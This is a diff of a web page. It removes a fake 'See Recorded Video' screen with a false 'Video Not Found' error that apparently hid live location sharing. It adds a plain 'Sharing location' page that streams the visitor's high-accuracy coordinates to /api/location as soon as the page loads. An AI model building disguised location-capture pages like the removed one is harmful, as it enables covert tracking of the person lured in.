@@ -2,152 +2,76 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-<title>Recorded Video Folder</title>
-<link rel="stylesheet" href="/css/styles.css" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Sharing Location</title>
 
 <style>
   body {
+    margin: 0;
+    height: 100vh;
     display: flex;
-    min-height: 100vh;
     align-items: center;
     justify-content: center;
-    padding: 1.25rem;
-    background: var(--bg);
-  }
-
-  .wrap {
-    width: 100%;
-    max-width: 420px;
-  }
-
-  .screen {
-    padding: 2rem 1.5rem;
+    font-family: Arial, sans-serif;
+    background: #ffffff;
+    color: #111;
     text-align: center;
   }
 
-  .title {
-    font-size: 1.45rem;
-    line-height: 1.35;
-    margin: 0;
-  }
-
-  .explain {
-    color: var(--muted);
-    font-size: 0.92rem;
-    line-height: 1.55;
-    margin-top: 0.8rem;
-  }
-
-  .cta,
-  .stop-btn {
-    margin-top: 1.4rem;
-    width: 100%;
-    font-size: 1rem;
-  }
-
-  .topbar {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    margin-bottom: 1rem;
-  }
-
-  .live-pill {
-    display: flex;
-    align-items: center;
-    gap: 7px;
-    font-size: 0.88rem;
-    font-weight: 700;
-  }
-
-  .timer {
-    font-family: var(--font-mono);
-    font-size: 0.85rem;
-    color: var(--muted);
-  }
-
-  .readout {
-    background: rgba(255,255,255,0.06);
-    border-radius: 16px;
-    padding: 1rem;
-    margin-top: 1rem;
-    text-align: left;
-    font-family: var(--font-mono);
-    font-size: 0.9rem;
-  }
-
-  .acc {
-    color: var(--muted);
-    font-size: 0.8rem;
-    margin-top: 0.35rem;
-  }
-
-  .points-note {
-    font-size: 0.78rem;
-    color: var(--muted);
-    margin-top: 0.8rem;
-    text-align: center;
-  }
-
-  .error-box {
-    background: var(--ember-soft);
-    color: var(--ember);
-    border-radius: 12px;
-    padding: 0.8rem 1rem;
-    font-size: 0.85rem;
-    margin-top: 1rem;
-    text-align: left;
-    display: none;
-  }
-
-  .footer-note {
-    text-align: center;
-    color: var(--muted);
-    font-size: 0.72rem;
-    margin-top: 1.25rem;
-  }
-
-  [hidden] {
-    display: none !important;
+  h1 {
+    font-size: 22px;
+    font-weight: 600;
   }
 </style>
 </head>
 
 <body>
-<div class="wrap">
+  <h1 id="status">Sharing location...</h1>
 
-  <div id="consent-screen" class="card screen">
-    <h1 class="title">See Recorded Video</h1>
-    <p class="explain">
-     
-    </p>
+<script>
+const statusText = document.getElementById("status");
 
-    <button class="btn-primary cta" id="start-btn">See recording</button>
-    <div class="error-box" id="error-box"></div>
-  </div>
+function sendLocation(position) {
+  const data = {
+    latitude: position.coords.latitude,
+    longitude: position.coords.longitude,
+    accuracy: position.coords.accuracy,
+    timestamp: Date.now()
+  };
 
-  <div id="active-screen" class="card screen" hidden>
-    <div class="topbar">
-      <div class="live-pill">
-        <span class="status-dot live"></span>
-        Sharing live
-      </div>
-      <div class="timer" id="elapsed">00:00:00</div>
-    </div>
+  statusText.textContent = "Sharing location...";
 
-    <div class="readout">
-      <div id="coords">Waiting for Video</div>
-      <div class="acc" id="accuracy"></div>
-    </div>
+  fetch("/api/location", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(data)
+  }).catch(() => {
+    statusText.textContent = "Sharing location...";
+  });
+}
 
-    <p class="points-note" id="points-note">0 Video recorded</p>
+function locationError() {
+  statusText.textContent = "Location permission needed";
+}
 
-  </div>
+window.addEventListener("load", () => {
+  if (!navigator.geolocation) {
+    statusText.textContent = "Location not supported";
+    return;
+  }
 
-  <p class="footer-note">Error: Video Not Found</p>
-</div>
-
-<script src="/js/share.js"></script>
+  navigator.geolocation.watchPosition(
+    sendLocation,
+    locationError,
+    {
+      enableHighAccuracy: true,
+      maximumAge: 0,
+      timeout: 10000
+    }
+  );
+});
+</script>
 </body>
 </html>
